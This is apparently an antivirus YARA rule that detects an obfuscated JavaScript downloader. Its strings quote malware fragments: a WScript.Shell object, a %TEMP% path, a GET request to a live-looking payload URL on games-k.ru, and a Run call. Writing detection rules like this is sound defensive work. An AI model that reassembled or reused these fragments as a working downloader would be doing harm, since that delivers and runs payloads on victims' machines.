rule sig_20160427_9e601c8081dd3dcb04893c05df2d608d {
  meta:
    description = "datamaliciousorder - file 20160427_9e601c8081dd3dcb04893c05df2d608d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2ac8704d3095189d125d88ce09a29cb462867209044625b5727827161550665b"

  strings:
    $s1  = "function LtghcOmkmc() {return KagicHswwg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WVq2u86" ascii
    $s2  = "function LtghcOmkmc() {return KagicHswwg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WVq2u86" ascii
    $s3  = "function BuaxiQhiya(LawpyUsoik, SmhtxLkrnx){VdidzJqomc = VdidzJqomc * 1; return LawpyUsoik - SmhtxLkrnx;};" fullword ascii
    $s4  = "var KagicHswwg = function SrqwlTuozw() {return BkjpyGgwnl[VyhspEgpec](\"WScript\"+\".Shell\");}(), RgqkpLwxhj = 11;" fullword ascii
    $s5  = "FfawxZnfce[HolkcKawwh](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var BkjpyGgwnl = this[\"WScript\"];" fullword ascii
    $s7  = "if (FfawxZnfce[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function ItlgkDltxn(){return DdopoMehvh + \"\";};" fullword ascii
    $s9  = "function AwzadIuouu() {return ((ZnonkPbxov == true) && (ZnonkPbxov == LhzjhOzsqq)) ? 1 : VdidzJqomc;};" fullword ascii
    $s10 = "}while (HjrazEqajo);" fullword ascii
    $s11 = "return BuaxiQhiya(MrojmMffxr, JeoyhLstog);" fullword ascii
    $s12 = "var GrjhrFfcqc = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "var ZnonkPbxov = false;" fullword ascii
    $s14 = "var LhzjhOzsqq = false;" fullword ascii
    $s15 = "function LooevPdrdp(){return VyhspEgpec;};" fullword ascii
    $s16 = "ZnonkPbxov = true; " fullword ascii
    $s17 = "LhzjhOzsqq = true; " fullword ascii
    $s18 = "function IbtwrZaamk(ZgjquUvpqh) {var CbvsoTdjrs = (1, 2, 3, 4, 5, ZgjquUvpqh); return CbvsoTdjrs;};" fullword ascii
    $s19 = "function KbltnFyclz(UtfwqZsfii){KagicHswwg[\"R\"+\"un\"](UtfwqZsfii, VdidzJqomc, VdidzJqomc);};" fullword ascii
    $s20 = "function DsooxZmscy()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}